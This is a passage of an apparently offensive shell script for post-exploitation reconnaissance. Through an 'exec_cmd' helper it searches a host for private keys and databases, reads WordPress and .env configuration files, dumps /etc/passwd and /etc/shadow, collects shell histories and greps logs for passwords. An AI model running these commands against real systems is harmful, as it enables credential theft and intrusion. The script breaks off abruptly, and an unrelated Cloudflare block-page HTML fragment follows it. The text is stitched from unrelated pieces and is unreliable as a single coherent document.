# 5. File system reconnaissance
echo "[5] File System Exploration..."
exec_cmd "ls -la /home/"
exec_cmd "ls -la /var/www/"
exec_cmd "find / -name '*.pem' -o -name '*.key' 2>/dev/null | head -10"
exec_cmd "find / -name '*.sql' -o -name '*.db' 2>/dev/null | head -10"

# 6. Web application analysis
echo "[6] Web Application Analysis..."
exec_cmd "ls -la /var/www/html/"
exec_cmd "cat /var/www/html/wp-config.php 2>/dev/null"
exec_cmd "find /var/www/html -name 'config.*' -o -name '.env' 2>/dev/null"

# 7. User and password hunting
echo "[7] User & Credential Hunting..."
exec_cmd "cat /etc/passwd"
exec_cmd "cat /etc/shadow 2>/dev/null"
exec_cmd "find / -name '.bash_history' 2>/dev/null | head -5"
exec_cmd "find / -name '*.log' -exec grep -l 'password' {} \; 2>/dev/null | head -5"

There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.</p>
          </div>

          <div class="cf-column">
            <h2 data-translate="blocked_resolve_headline">What can I do to resolve this?</h2>

            <p data-translate="blocked_resolve_detail">You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.</p>
